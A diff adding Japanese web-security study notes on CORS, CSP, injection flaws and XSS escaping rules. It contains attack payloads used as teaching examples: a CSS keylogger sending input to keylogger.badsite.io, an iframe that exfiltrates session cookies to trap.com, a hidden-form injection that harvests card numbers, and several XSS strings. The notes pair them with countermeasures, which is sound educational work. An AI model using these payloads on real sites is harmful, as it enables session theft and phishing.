@@ -186,3 +186,443 @@ input[value$="~~"] { background-image: url("//keylogger.badsite.io/%7E%7E"); }
 </style>
 ```
 keylogger.badsite.ioでアクセスを見て入力文字を知る
+
+# オリジン間リソース共有（CCORS:Cross-Origin Resource Sharing）
+* 同一生成元ポリシーは安全だけど窮屈なこともしばしば
+    * `<img>`, `<video>`, `<audio>`などは異なるオリジンに埋め込める
+    * XMLHttpRequestやFetch APIは同一生成元ポリシーに従う
+* CORSはクライアントが現在のサイトとは別のドメインのリソースにアクセスする権限を得られる仕組み
+* 2014にW3C勧告
+* ブラウザはオリジン間HTTPリクエストを発行する
+
+## 簡単な例
+* `http://sample1.com`のコンテンツがXMLHttpRequestを用いて`http://sample2.com`のコンテンツを取得したい
+* ブラウザはGETメソッドに`Origin: http://sample1.com`を追加して送信
+* サーバは`Access-Control-Allow-Origin: *`を返答
+* ブラウザは`http://sample1.com`のコンテンツを取得可能
+
+### ドメイン制限
+
+* `Access-Control-Allow-Origin: <origin>`とすると`<origin>`のURIのみアクセスしてよい
+
+### ブラウザのJavaScriptの例
+```
+fetch('http://sample2.com', {
+  mode: 'cors'
+}).then(...)
+```
+
+### サーバの動作
+* クライアントから送られた`Origin: <origin>`の`<origin>`を確認して問題なければ
+```
+Access-Control-Allow-Origin: <origin>
+```
+というヘッダを追加する
+
+# CSP(Content Security Policy)
+
+* XSSなどの攻撃対策の一つ
+* サーバが`Content-Security-Policy`ヘッダを返すことでCSPが有効になる
+    * ブラウザの挙動を制限する
+    * 実行を許可するスクリプトのドメインを指定
+        * 全てのスクリプトの実行を拒否することも可能
+    * 通信プロトコルの指定
+        * 全てのコンテンツをHTTPSのみにする
+        * 全てのCookieにsecureフラグをつける
+        * HTTPからHTTPSへのリダイレクト
+        * 暗号化された通信路のみを用いるようにする
+
+## ポリシーの設定
+```
+Content-Security-Policy: <policy-derective>
+```
+
+### 全てのコンテンツを自身のサイト(サブドメインは含まない)からのみ取得可能にする
+```
+Content-Security-Policy: default-src 'self'
+```
+
+* `<script>コード</script>`は禁止される
+    * `unsafe-inline`で許可
+* `<script src="自身と同じURI"></script>`のみOK
+* eval禁止
+    * `unsafe-eval`をつけると許可
+
+
+### 自身のサイトと信頼された別のドメインを指定
+```
+Content-Security-Policy: default-src 'self' *.trusted.com
+```
+
+### スクリプト、メディア、画像をそれぞれ指定する(本当は一行)
+```
+Content-Security-Policy: default-src 'self';
+  img-src *;
+  media-src media1.com media2.com;
+  script-src trusted.com
+```
+img画像は任意, メディアはmedia1.com, media2.comのみ, スクリプトはtrusted.comのみ
+
+### スクリプトをHTTPSのドメインにのみ制限
+```
+Content-Security-Policy: default-src https://trusted.com
+```
+
+# 4 Webアプリケーションの機能別に見るセキュリティバグ
+
+## 脆弱性の発生場所
+
+### Webアプリケーションの機能
+
+```
+ブラウザ
+↓
+HTTPリクエスト
+↓
+入力値検証
+↓
+├ブラウザ ; XSS, HTTPヘッダインジェクション
+├RDB      ; SQLインジェクション
+├シェル   ; OSコマンドインジェクション
+├メール   ; メールヘッダインジェクション
+├ファイル ; ディレクトリトラバーサル
+```
+
+### インジェクション系脆弱性
+
+脆弱性名                     | インタフェース | 悪用手口                | データの終端
+-----------------------------|----------------|-------------------------|-------------
+XSS                          |HTML            |JavaScript               | <"
+HTTPヘッダインジェクション   |HTTP            |HTTPレスポンスヘッダ     | 改行
+SQLインジェクション          |SQL             |SQL命令の注入            | '
+OSコマンドインジェクション   |シェルスクリプト|コマンドの注入           | ;|
+メールヘッダインジェクション |sendmailコマンド|ヘッダや本文の注入・改変 | 改行
+
+## 入力処理とセキュリティ
+
+Webアプリケーションの入力とはHTTPリクエストとして渡されるパラメータ
+
+### 入力処理
+
+* 文字エンコーディングの妥当性検証
+    * 文字コードを使った攻撃手法がある
+    * 最近はUTF-8のみにしてしまうことが多い
+* 文字エンコーディングの変換
+    * cp932(Shift_JIS))をUTF-8に変換する
+* パラメータ文字列の妥当性検証
+
+## 4-2 入力処理とセキュリティ
+
+### 目的
+利用者の入力ミスや、データの不整合を防いでシステムの信頼性を向上させる
+
+* 数値のみの項目に英字や記号が入っていないか
+* 長すぎるデータ・とても未来の日付
+* 更新処理の途中でエラーになっていないか
+* 入力者が多数の項目を入力してからエラーになって全部やり直すのは辛い
+* メールアドレス未入力なのにメール送信処理を実行する
+
+セキュリティに対する根本対策ではない(セーフティネットの一つではある)
+
+### バイナリセーフ
+* 値0の1byte(ヌルバイト)を含むデータ列を安全に処理できること
+* ヌルバイトはCで特別扱いされるため正しく処理できないことが多いため
+* 入力値にヌルバイトが含まれていればエラーにする(全ての文字を許容する仕様だと使えない)
+
+### 入力検証対象のパラメータ
+* 全てのパラメータ(hiddenパラメータ、ラジオボタン、select要素、クッキーの値など)
+
+## 4-3 表示処理に伴う問題
+Webアプリケーションに外部からの入力に応じて表示が変化する部分があり、
+そのHTML生成の実装に問題があるとXSSが発生する
+
+* ブラウザ上で攻撃者が用意したスクリプトが実行されてクッキーを盗まれる
+* ブラウザ上で攻撃者が用意したスクリプトが実行されてWebアプリの機能を悪用される
+* Webサイトに偽の入力フォームが表示されてフィッシングの被害を受ける
+
+### XSSによるクッキー値の表示
+PHPの例
+```
+<?php echo $_GET['keyword']; ?>
+```
+に
+```
+keyword=<script>alert(document.cookie)</script>
+```
+を指定するとセッションIDが表示される
+
+### 受動的攻撃により他人のクッキー値を盗む
+罠サイト(`http://trap.com/`)の中にiframeで標的サイト(`http://target.com/`))のページを表示させる
+```
+<html><body>
+<iframe src="http://target.com/?keyword=<script>window.location='http://trap.com/?id='%2Bdocument.cookie</script>">
+</iframe>
+</body></html>
+```
+
+* このサイトに攻撃者を誘導する
+* iframeの中でkeyword以下の次のスクリプトが実行される
+```
+<script>
+window.location='http://trap.com/?id='+document.cookie
+</script>
+```
+
+* `http://trap.com/?id=セッションID`に遷移してtrap.comにログが残る
+
+### JavaScriptを使わないXSSの例
+ログイン機能の無いサイトのXSS脆弱性の悪用
+
+* XSS脆弱性がある粗大ゴミ受け付けサイト(target.com)
+```
+<form method="POST">
+氏名<input name="name" value="<?php echo @$_POST['name']; ?>">
+<input type=submit value="申し込み">
+</form>
+```
+* このサイトを利用して罠サイトを作成する
+
+```
+<html><body>
+<form action="https://target.com/" method="POST">
+<input name="name" type="hideen" value='"></form><form style=... action=http://trap.com method=POST>
+カード番号<input name=card><input value=申し込み type=submit></form>'>
+
+<input style=... type="submit" value="粗大ゴミ申し込み">
+</form>
+</body></html>
+```
+
+* これは粗大ゴミ申し込みサイトへのリンクに見える
+* クリックすると`https://target.com`のサイトに移動する
+* 元のフォームが隠されて新しい`form`が開始する
+```
+<form style=... action=http://trap.com method=POST>
+カード番号<input name=card>
+<input value=申し込み type=submit>
+</form>
+```
+* styleにより元のフォームを隠してactionのURLに罠サイト(`http://trap.com`)を指定する
+
+### 反射型XSSと持続型XSS
+* 反射型(reflected)XSS 攻撃用JavaScriptが攻撃対象サイトとは別のサイトにある場合
+    * 入力値をそのまま表示するページで発生することが多い
+    * 罠サイトへの誘導が必要
+* 持続型(stored/persistent)XSS
+    * 攻撃用JavaScriptが攻撃対象のデータベースなどに保存される場合
+    * WebメールやSNSなどで発生しやすい
+    * 罠サイトへの誘導が不要で攻撃しやすい
+* DOMベースXSS
+    * サーバを経由せずにJavaScriptのみで表示しているパラメータがあるページに発生する
+
+### 脆弱性が生まれる原因
+
+* HTML生成のときにメタ文字を正しく扱わないため
+* メタ文字を文字そのものとして扱うエスケープ処理が必要
+
+エスケープ方法
+
+置かれている場所|解釈されるもの |終端文字|エスケープ方法
+----------------|---------------|--------|--------------------------------------
+要素内容        |タグと文字参照 |  <     |<と&を文字参照にする
+属性値          |文字参照       |  "     |属性値を"で囲み<と"と&を文字参照にする
+
+### 引用符で囲まない属性値のXSS
+
+```
+<input type=text name=mail value=<?php echo $_GET['p']; ?>>
+```
+
+* `p`に`1+onmouseover%3dalert(document.cookie)`を与える
+* 上記inputは次のように展開される
+
+```
+<input type=text name=mail value=1 onmouseover=alert(document.cookie)>
+```
+* 属性値を引用符で囲まないと空白スペースが属性値の終わりになる
+* 空白を挟んで属性値を追加できる
+
+### 引用符で囲っていても"をエスケープしないとXSS
+```
+<input type="text" name="mail" value="<?php echo $_GET['p']; ?>">
+```
+* `p`に"+onmouseover%3d"alert(document.cookie)`を与える
+* 上記inputは次のように展開される
+```
+<input type="text" name="mail" value="" onmouseover="alert(document.cookie)">
+```
+
+### 対策
+再掲
+* 要素内容は「<」と「&」をエスケープする
+* 属性値は""でくくって「<」と「"」と「&」をエスケープする
+* (エンコーディング)`Content-Type: text/html; charset=UTF-8'`で文字エンコーディングを固定する
+
+## 発展編
+```
+<html>
+<body onload="init('xxx')">
+<form ...>
+<input name="tel" value="012-345-6789">
+<input type="submit">
+</form>
+<a href="http://sample.com">xxx</a>
+<p>
+text
+<p>
+<script>
+document.write('xxx')
+</script>
+</form>
+</html>
+```
+
+置かれている場所            |解釈されるもの |終端文字|エスケープ方法
+----------------------------|---------------|--------|--------------------------------------
+要素内容                    |タグと文字参照 |  <     |<と&を文字参照にする
+属性値                      |文字参照       |  "     |属性値を"で囲み<と"と&を文字参照にする
+属性値(URL)                 |同上           |同上    |URLの形式を検査してから属性値としてエスケープ
+イベントハンドラ            |同上           |同上    |JavaScriptとしてエスケープしてから属性値としてエスケープ
+script要素内の文字列リテラル|解釈されない   |</      |JavaScriptとしてエスケープし「</」が出ないように配慮
+
+## href属性やsrc属性のXSS
+* a要素のhref属性, img要素, frame要素のsrc属性などはURLを属性値としてとる
+* このURLには`javascript:JavaScript式`を指定してJavaScriptを起動できる
+
+```
+<body>
+<a hrf="<?php echo htmlspecialchars($_GET['url']); ?>">bookmark</a>
+</body>
+```
+を`http://trap.com/?url=javascript:alert(document.cookie)`で起動すると
+
+```
+<body>
+<a hrf="javascript:alert(document.cookie)">bookmark</a>
+</body>
+```
+になる. このリンクを選択するとJavaScriptが起動する
+
+### URLを生成する場合の対策
+* httpまたはhttpsスキームのみを許可するようにチェックする
+* `http:`または`https:`または`/`で始まる相対URLしか許容しない
+
+### リンク先ドメインのチェック
+* リンク先ドメインが外部ドメインならエラーにする
+* または 外部ドメインへのリンクであることを利用者に注意喚起する
+
+## JavaScriptの動的生成
+
+### イベントハンドラのXSS
+XSSがある例(JavaScriptの文字列リテラルのエスケープが抜けている)
+```
+<body onload="init('<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES) ?>')">
+</body>
+```
+`name=');alert(document.cookie)//`を渡して起動すると
+```
+<body onload="init('&#039;);alert(document.cookie)//')">
+```
+となる. onloadイベントハンドラは属性値の文字列参照を解釈するので
+```
+init('');alert(document.cookie)//')
+```
+が実行される
+
+* データをJavaScript文字列リテラルとしてエスケープする
+    * \ → \\\\
+    * ' → \'
+    * " → \"
+    * 改行 → \n
+* その結果をHTMLエスケープする
+
+先ほどの場合は`name=\';alert(document.cookie)//`を渡すので
+
+```
+<body onload="init('\&#039;);alert(document.cookie)//')">
+```
+となる. onloadイベントハンドラは
+```
+init('\');alert(document.cookie)//')
+```
+と解釈される(多分エラー)
+
+### script要素のXSS
+* script要素内はタグや文字参照を解釈しないのでHTMLとしてのエスケープは不要
+* JavaScriptの文字列リテラルとしてエスケープ
+* が、これだけでは不十分
+```
+<?php
+/* 「\」,「'」, 「"」の前に「\」を挿入してJavaScript文字列としてエスケープ */
+function escape_js($s) {
+  return mb_ereg_replace('([\\\\\'"])', '\\\1', $s);
+}
+?>
+<body>
+<script src="jquery.js"></script>
+こんにちは<span id="name"></span>さん
+<script>
+  $('#name').text('<?php echo escape_js($_GET['name']); ?>');
+</script>
+</body>
+```
+
+JavaScriptは文脈を見ずに`</script>`がでると終わる
+```
+<script>
+  foo('</script>')
+</script>
+```
+この例では`foo('`が実行される(そしてエラー)
+
+* `</script><script>alert(document.cookie)//`を渡すと
+```
+<script>
+  </script><script>alert(document.cookie)//
+</script>
+```
+となってXSSが成功する
+
+* 生成するJavaScriptに`</`が入らないように気を付ける
+
+### まとめ
+* JavaScriptの文法から「"」「'」「\」「改行」の前に「\」を入れる
+* イベントハンドラの場合は文字参照をHTMLエスケープして「"」で囲む
+* script要素の場合は「</」が出ないようにする
+
+ルールが複雑なためJavaScriptの動的生成はしない
+
+それでも動的パラメータをJavaScriptに渡したい場合
+
+### Unicodeエスケープ
+英数字と「-」「.」以外を全て\uXXXXという形に変換する
+
+### script要素の外部でパラメータを定義してJavaScriptから参照する
+hiddenパラメータを利用して動的生成をさける
+
+```
+<input type="hidden" id="js_name" value="<?php echo htmlspecialchars($name, ENT_COMPAT, 'UTF-8'); ?>">
+<script>
+const name = document.getElementById('js_name').value
+...
+</script>
+```
+属性値のエスケープの原則だけ守ればよいのでルールがシンプルになる
+
+## DOMベースMXSS
+JavaScriptのクライアント側での処理の問題(サーバで生成したHTMLには攻撃者の注入したJavaScriptは現れない)
+```
+<body>
+こんにちは
+<script>
+document.URL.match(/name=([^&]*)/)
+document.write(unescape(RegExp.$1))
+</script>
+</body>
+```
+はクエリー文字`name=`に指定した名前を表示する
+
+```
+http://sample.com/?name=<script>alert(document.cookie)</script>
+```
+はJavaScriptが実行される
